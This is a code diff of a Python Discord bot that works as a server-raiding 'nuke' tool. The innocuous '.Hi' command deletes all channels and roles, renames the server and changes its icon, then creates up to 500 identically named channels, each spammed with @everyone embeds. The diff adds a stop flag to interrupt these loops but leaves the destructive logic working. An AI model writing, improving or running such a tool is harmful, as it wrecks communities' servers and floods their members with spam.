@@ -15,6 +15,9 @@ intents.members = True
 bot = commands.Bot(command_prefix='.', intents=intents)
 Token = os.environ.get("Token")
 
+# Global stop flag
+stop_requested = False
+
 # Replace with your authorized user IDs (up to 5)
 AUTHORIZED_USER_IDS = [
     719648115639975946,  # User ID 1
@@ -26,21 +29,26 @@ AUTHORIZED_USER_IDS = [
 
 @bot.event
 async def on_ready():
+    global stop_requested
+    stop_requested = False
     print(f'✅ Bot connected as {bot.user}')
-
 
 @bot.command()
 async def stop(ctx):
+    global stop_requested
     if ctx.author.id not in AUTHORIZED_USER_IDS:
         await ctx.send("❌ You are not authorized to use this command.")
         return
 
-    await ctx.send("🛑 Shutting down the bot...")
-    print("🛑 Bot is shutting down...")
-    await bot.close()
+    stop_requested = True
+    await ctx.send("🛑 Stop signal received. Attempting to halt operations.")
+    print("🛑 Stop signal received.")
 
 @bot.command()
 async def Hi(ctx):
+    global stop_requested
+    stop_requested = False  # Reset stop flag at start
+
     if ctx.author.id not in AUTHORIZED_USER_IDS:
         await ctx.send("❌ You are not authorized to use this command.")
         return
@@ -59,14 +67,18 @@ async def Hi(ctx):
         if role.name != '@everyone':
             delete_tasks.append(delete_role(role))
 
-    await asyncio.gather(*delete_tasks)
+    for task in asyncio.as_completed(delete_tasks):
+        if stop_requested:
+            await ctx.send("🛑 Operation stopped during deletion.")
+            return
+        await task
+
     print("✅ Finished deleting channels and roles.")
 
-    # 🔧 Change server name to "Bayview OT" and set logo
+    # Change server name and logo
     try:
         logo_url = "https://cdn.discordapp.com/attachments/1342240703157112997/1360860432008745050/414cf46982f0562c61f2a9876ae3cf82.png?ex=67fca78a&is=67fb560a&hm=c9a72b3ed3c15068caae8014467b3f3f032bcae01b1e5c460964aa6f6e7ed390&"
         
-        # Fetch image using aiohttp
         async with aiohttp.ClientSession() as session:
             async with session.get(logo_url) as resp:
                 if resp.status == 200:
@@ -78,11 +90,15 @@ async def Hi(ctx):
     except Exception as e:
         print(f'⚠️ Failed to change server name and set logo: {e}')
 
-    # Create up to 500 channels and send embed messages
+    # Create channels
     MAX_CHANNELS = 500
     try:
         for i in range(1, MAX_CHANNELS + 1):
-            channel_name = "bayview-OT"  # No numbering, just the fixed name
+            if stop_requested:
+                await ctx.send("🛑 Operation stopped during channel creation.")
+                break
+
+            channel_name = "bayview-OT"
             new_channel = await guild.create_text_channel(channel_name)
             print(f'📁 Created channel: {new_channel.name}')
 
@@ -92,17 +108,16 @@ async def Hi(ctx):
                 color=discord.Color.red()
             )
             embed.set_footer(text="Bayview OT ")
-
-            # Set embed thumbnail to the same logo
             embed.set_thumbnail(url=logo_url)
 
             await new_channel.send(content="@everyone", embed=embed)
 
-        await ctx.send(f"✅ Created {MAX_CHANNELS} channels and sent embed invites.")
+        if not stop_requested:
+            await ctx.send(f"✅ Created {MAX_CHANNELS} channels and sent embed invites.")
 
     except Exception as e:
         print(f'❌ Error creating channels: {e}')
-        await ctx.send("⚠️ An error occurred during migration.")
+        await ctx.send("⚠️ An error occurred during channel creation.")
 
 # Helper functions for deleting channels and roles
 async def delete_channel(channel):
@@ -122,6 +137,5 @@ async def delete_role(role):
         print(f'🚫 Permission error deleting role: {role.name}')
     except Exception as e:
         print(f'❌ Error deleting role {role.name}: {e}')
-
 
 bot.run(Token)
